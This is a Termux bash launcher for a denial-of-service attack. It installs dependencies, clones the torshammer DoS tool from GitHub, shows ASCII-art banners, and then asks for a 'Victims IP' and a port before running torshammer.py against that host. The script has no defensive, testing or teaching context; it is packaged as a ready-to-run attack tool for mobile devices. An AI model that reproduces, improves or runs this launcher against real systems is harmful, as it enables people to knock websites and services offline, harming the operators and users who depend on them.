#!/data/data/com.termux/files/usr/bin/bash

# # -----ASNI COLORS-
DEF="\e[39m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
LGRAY="\e[37m"
DGRAY="\e[90m"
LRED="\e[91m"
LGREEN="\e[92m"
LYELLOW="\e[93m"
LBLUE="\e[94m"
LMAGENTA="\e[95m"
LCYAN="\e[96m"
WHITE="\e[97m"

clear

mainLogo() {
echo -e "   ${LRED}                                ,-."
echo -e "   ${LRED}                               ( O_)"
echo -e "   ${LRED}                              / \`-/"
echo -e "   ${LRED}                             /-. /"
echo -e "   ${LRED}                            /   )"
echo -e "   ${LRED}                           /   /"
echo -e "   ${LRED}              _           /-. /"
echo -e "   ${LRED}             (_)*-._     /   )"
echo -e "   ${LRED}               *-._ *-\'**( )/"
echo -e "   ${LRED}                   *-/*-._* \`."
echo -e "   ${LRED}                    /     *-.\'._"
echo -e "   ${LRED}                   /\       /-._*-._"
echo -e "   ${LRED}    _,---...__    /  ) _,-*/    *-(_)"
echo -e "   ${LRED}___<__(|) _   **-/  / /   /"
echo -e "   ${LRED} '  \`----' **-.   \/ /   /"
echo -e "   ${LRED}               )  ] /   /"
echo -e "   ${LRED}       ____..-'   //   /                       )"
echo -e "   ${LRED}   ,-**      __.,'/   /   ___                 /,"
echo -e "   ${LRED}  /    ,--**/  / /   /,-**   ***-.          ,'/"
echo -e "   ${LRED} [    (    /  / /   /  ,.---,_   \`._   _,-','"
echo -e "   ${LRED}  \    \`-./  / /   /  /       \`-._  *** ,-'"
echo -e "   ${LRED}   \`-._  /  / /   /_,'            **--*"
echo -e "   ${LRED}       */  / /   /*"
echo -e "   ${LRED}       /  / /   /"
echo -e "   ${LRED}      /  / /   /"
echo -e "   ${LRED}     /  |,'   /"
echo -e "   ${LRED}    :   /    /"
echo -e "   ${LRED}    [  /   ,'"
echo -e "   ${LRED}    | /  ,'"
echo -e "   ${LRED}    |/,-'"
echo -e "   ${LRED}    '"
}

wlcBanner() {
echo -e " ${BLUE} _  _  _ _______        _______  _____  _______ _______"
echo -e " ${BLUE} |  |  | |______ |      |       |     | |  |  | |______"
echo -e " ${BLUE} |__|__| |______ |_____ |_____  |_____| |  |  | |______"
}

startup() {
clear

echo
wlcBanner
echo
sleep 4
menu
}

menu() {
clear

echo
mainLogo
echo
echo -ne " ${LRED}Enter Victims IP : ${WHITE}"
read target
echo -ne " ${LRED}Enter Port ${LGREEN}(Default = 80) ${LRED}: ${WHITE}"
read port

python2.7 torshammer.py -t ${target} -r ${port}

}

clear

echo
echo -e " ${LGREEN}Installing Packages..."
echo -e " ${DEF}"

pkg install apt
apt-get install pv -y
apt-get install coreutils -y
apt-get install ruby -y
apt-get install python2 -y
apt-get install git -y
gem install lolcat

echo
echo -e " ${LGREEN}Installing Dos Script..."
echo -e " ${DEF}"

if [ -d "torshammer" ]
then
menu
fi

git clone "https://github.com/Karlheinzniebuhr/torshammer"

clear

startup
